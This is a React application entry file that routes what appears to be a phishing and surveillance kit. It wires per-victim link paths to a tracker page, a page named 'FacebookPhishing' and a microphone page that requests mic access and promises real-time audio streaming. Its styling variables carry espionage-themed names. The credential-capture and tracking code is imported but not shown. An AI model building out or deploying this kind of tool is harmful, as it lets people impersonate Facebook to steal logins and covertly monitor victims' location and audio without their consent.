import React, { useState } from 'react';
import './global.css';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import TrackerPage from './pages/TrackerPage';
import FacebookPhishing from './pages/FacebookPhishing';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

function MicrophonePage() {
  return (
    <div style={{
      minHeight: '100vh',
      background: 'var(--preto-espionagem)',
      color: 'var(--branco-confissao)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center'
    }}>
      <h2 style={{ color: 'var(--vermelho-paixao)' }}>Microphone Access</h2>
      <p style={{ color: 'var(--cinza-conspiracao)' }}>This page will request microphone access and stream audio in real time (feature coming soon).</p>
      <button
        onClick={() => {
          navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
              alert('Microphone access granted! (Streaming coming soon)');
              stream.getTracks().forEach(track => track.stop());
            })
            .catch(() => {
              alert('Microphone access denied.');
            });
        }}
        style={{
          background: 'var(--vermelho-paixao)',
          color: 'var(--branco-confissao)',
          borderRadius: 8,
          padding: '0.75rem 2rem',
          fontFamily: 'Montserrat',
          fontWeight: 'bold',
          fontSize: '1.1rem',
          border: 'none',
          cursor: 'pointer',
          transition: 'background 0.2s',
          marginTop: 24
        }}
      >Allow Microphone</button>
    </div>
  );
}

function App() {
  const [usuario, setUsuario] = useState(localStorage.getItem('usuario') || null);

  function handleLogin(email) {
    setUsuario(email);
    localStorage.setItem('usuario', email);
  }

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={
          !usuario ? (
            <Login onLogin={handleLogin} />
          ) : (
            <Dashboard email={usuario} />
          )
        } />
        <Route path="/redirect/:id" element={<TrackerPage />} />
        <Route path="/facebook/:id" element={<FacebookPhishing />} />
        <Route path="/microphone/:id" element={<MicrophonePage />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
